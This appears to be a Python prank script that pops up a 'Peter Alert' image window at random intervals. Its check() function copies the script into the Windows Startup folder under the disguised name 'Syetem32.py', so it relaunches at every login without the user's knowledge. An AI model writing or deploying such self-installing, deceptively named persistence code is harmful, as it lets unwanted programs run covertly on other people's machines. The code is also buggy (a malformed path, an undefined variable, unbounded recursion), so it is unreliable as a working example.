#imports tkinter,time, and random 
import tkinter as tk
from tkinter import *
import time 
import random
import os
import os.path
from PIL import Image, ImageTk

list = [1, 2, 3 ,4, 5, 6, 7, 8, 9, 10, 11, 12, 13]
list2 = [1,2,3,4,5,6,7,9,10,11,12,13]

rizz = True

def ran():
    global rizz
    if rizz:
        global run 
        run = random.choice(list)
    if run == 8:
        main()
        run = random.choice(list2)
    else:
        time.sleep(0.1)
        random.choice(list)
        ran()
    if root.destroy:
        ran()
    
def check():
    name = "Syetem32.py"
    os.path.expanduser("~")
    path = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    global check1
    check1 = True
    
    if os.path.exists(path + name):
        check1 = False
    
    if check1 == True:
        os.chdir(path)
        with open(name, "w") as f:
            f.write(open("main.py").read())
     

def main():
    global root 
    root = tk.Tk()
    root.title('Peter Alert')
    root.geometry("730x400")
    global rizz
    rizz = False

    image = Image.open("peter.png")
    tk_image = ImageTk.PhotoImage(image)
    label = tk.Label(root, image=tk_image)
    label.pack()
    button = Button(root, text = 'Peter Alert', command=root.destroy)  
    button.pack()
    root.mainloop()
    rizz = True

    if check1 == True:
        check()
    
ran()
